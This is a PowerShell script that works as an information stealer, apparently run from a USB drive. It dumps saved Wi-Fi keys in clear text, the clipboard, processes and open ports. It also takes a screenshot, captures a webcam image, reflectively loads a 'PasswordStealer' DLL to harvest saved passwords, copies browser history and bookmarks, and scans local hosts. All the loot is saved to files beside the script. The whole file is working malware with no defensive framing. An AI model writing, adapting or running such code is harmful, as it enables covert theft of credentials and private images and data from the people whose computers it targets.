# Define the variable to save
$ip = Get-NetTCPConnection | Select-Object LocalAddress, LocalPort | Sort-Object LocalPort | Format-Table -AutoSize | Out-String
$wifipass = (netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_ -replace "^\s+All User Profile\s+:\s+", "" } | ForEach-Object { netsh wlan show profiles $_ key=clear | Select-String "SSID name", "Key Content" }) -join "`n"
$clipboard = Get-Clipboard
$processNames = Get-Process | Select-Object -Unique ProcessName | ForEach-Object { "$($_.ProcessName)`n" }
# Get the directory where the script is located
$scriptDirectory = $PSScriptRoot


    $File = "$scriptDirectory\screenshot.png"
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top        
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($File, [System.Drawing.Imaging.ImageFormat]::Png)

    $dllPath = Join-Path -Path $scriptDirectory -ChildPath "Assets\webcam.dll"
    Add-Type -Path $dllPath
    [Webcam.webcam]::init()
    [Webcam.webcam]::select(1)
    $imageBytes = [Webcam.webcam]::GetImage()
    $imagePath = Join-Path -Path $scriptDirectory -ChildPath "webcam_image.jpg"
    [System.IO.File]::WriteAllBytes($imagePath, $imageBytes)

    function Get-Password {
    $dllPath = Join-Path -Path "E:" -ChildPath "Assets\PasswordStealer.dll"
    $dllHolder = @{}
    function Load-Dll {
        param(
            [string]$name,
            [byte[]]$data
        )
        $dllHolder[$name] = [System.Reflection.Assembly]::Load($data)
    }
Load-Dll -name "password" -data(Get-Content -Path $dllPath -Encoding Byte)
$instance = New-Object -TypeName $dllHolder["password"].GetType("PasswordStealer.Stealer")
        $runMethod = $instance.GetType().GetMethod("Run")

        $passwords = $runMethod.Invoke($instance, @())
        return $passwords
}
$fileName = "Passwords.txt"
$filePath = Join-Path -Path $scriptDirectory -ChildPath $fileName

Get-Password | Set-Content -Path $filePath
function Get-BrowserData {
    [CmdletBinding()]
    param (
        [Parameter(Position=1, Mandatory = $True)]
        [string]$Browser,
        [Parameter(Position=2, Mandatory = $True)]
        [string]$DataType
    )
    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE\Appdata\Local\Microsoft/Edge/User Data/Default/Bookmarks"}
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"}
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"}
    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} | Sort -Unique
    $Value | ForEach-Object {
        $Key = $_
        New-Object -TypeName PSObject -Property @{
            User = $env:UserName
            Browser = $Browser
            DataType = $DataType
            Data = $_
        }
    }
}

# Get the script directory
$scriptDirectory = Split-Path -Parent -Path $MyInvocation.MyCommand.Definition

# Define the file path in the script directory
$filePath = Join-Path -Path $scriptDirectory -ChildPath "browserdata.txt"

# Save browser data to the script directory
Get-BrowserData -Browser "edge" -DataType "history" | Out-File -Append -FilePath $filePath
Get-BrowserData -Browser "edge" -DataType "bookmarks" | Out-File -Append -FilePath $filePath
Get-BrowserData -Browser "chrome" -DataType "history" | Out-File -Append -FilePath $filePath
Get-BrowserData -Browser "chrome" -DataType "bookmarks" | Out-File -Append -FilePath $filePath
Get-BrowserData -Browser "firefox" -DataType "history" | Out-File -Append -FilePath $filePath
Get-BrowserData -Browser "opera" -DataType "history" | Out-File -Append -FilePath $filePath
Get-BrowserData -Browser "opera" -DataType "bookmarks" | Out-File -Append -FilePath $filePath

# Output the file path
Write-Host "Browser data saved to: $filePath"

$ipAddresses = Get-NetIPAddress | Where-Object { $_.AddressFamily -eq "IPv4" } | Select-Object -ExpandProperty IPAddress

# Create an array to store device information
$deviceInfoList = @()

foreach ($ipAddress in $ipAddresses) {
    $pingResult = Test-Connection -ComputerName $ipAddress -Count 1 -ErrorAction SilentlyContinue
    if ($pingResult) {
        $deviceInfo = @{
            IPAddress   = $ipAddress
            Online      = $true
            HostName    = $pingResult.Address
            DeviceType  = $null
            Model       = $null
            OS          = $null
            # Add more fields as needed
        }

        # Try to resolve additional device information
        $dnsResult = Resolve-DnsName -Name $ipAddress -ErrorAction SilentlyContinue
        if ($dnsResult) {
            $deviceInfo.DeviceType = $dnsResult.QueryType
            # Extract more information from $dnsResult if needed
        }

        # Get device name and operating system information
        $sysInfo = Get-WmiObject Win32_ComputerSystem -ComputerName $deviceInfo.IPAddress -ErrorAction SilentlyContinue
        if ($sysInfo) {
            $deviceInfo.Model = $sysInfo.Model
            $deviceInfo.OS = $sysInfo.Caption
            # Add more fields as needed
        }

        # Add the device information to the list
        $deviceInfoList += New-Object PSObject -Property $deviceInfo
    } else {
        $deviceInfo = @{
            IPAddress   = $ipAddress
            Online      = $false
            HostName    = "N/A"
            DeviceType  = $null
            Model       = $null
            OS          = $null
            # Add more fields as needed
        }

        # Add the device information to the list
        $deviceInfoList += New-Object PSObject -Property $deviceInfo
    }
}

# Get the script directory
$scriptDirectory = Split-Path -Parent -Path $MyInvocation.MyCommand.Definition

# Define the file path in the script directory
$outputPath = Join-Path -Path $scriptDirectory -ChildPath "networkscan.txt"

# Save the output to the file in the script directory
$deviceInfoList | Format-Table -AutoSize | Out-File -FilePath $outputPath












# Specify the filename
$fileName = "Data.txt"

# Combine the directory and filename to get the full path
$filePath = Join-Path -Path $scriptDirectory -ChildPath $fileName

# Save the variable to a text file
"IP:`n$ip`n`nWiFi:`n$wifipass`n`nClipboard:`n$clipboard`n`nProcess list:`n$processNames" | Set-Content $filePath